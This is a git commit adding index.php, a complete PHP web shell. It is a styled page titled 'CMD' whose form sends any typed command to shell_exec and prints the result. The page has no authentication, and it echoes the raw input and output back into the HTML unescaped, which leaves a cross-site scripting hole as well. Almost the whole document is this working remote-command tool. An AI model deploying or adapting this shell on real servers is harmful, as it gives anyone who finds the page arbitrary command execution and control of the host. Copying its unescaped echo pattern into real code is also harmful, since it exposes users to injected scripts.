21e131d3e6c8ccf3fcf1fff57e1f4578b8791ef7
Artyum <didifsx@hotmail.fr>
2017-01-08 20:09:04 +0400

    Create index.php

---
+++ index.php
@@ -0,0 +1,62 @@
+<?php
+
+if (!empty($_POST['cmd'])) {
+    $cmd = shell_exec($_POST['cmd']);
+}
+
+?>
+<!DOCTYPE html>
+<html>
+    
+<!-- By ArtyumX (https://github.com/ArtyumX) -->
+
+<head>
+
+    <meta charset="utf-8">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <link rel="stylesheet" type="text/css" href="//bootswatch.com/flatly/bootstrap.css">
+
+    <title> CMD </title>
+    
+    <style>
+        .container {
+            width: 850px;
+        }
+    </style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="page-header">
+        <h2> Execute a command </h2>
+    </div>
+
+    <form action="" method="POST">
+        <div class="form-group">
+            <label for="cmd">Command</label>
+            <input type="text" class="form-control" name="cmd" id="cmd" value="<?= $_POST['cmd'] ?>">
+        </div>
+        <button type="submit" class="btn btn-default">Execute</button>
+    </form>
+
+<?php if ($cmd): ?>
+    <div class="page-header">
+        <h2> Output </h2>
+    </div>
+    <pre>
+<?= $cmd ?>
+    </pre>
+<?php endif; ?>
+
+</div>
+
+</body>
+
+</html>
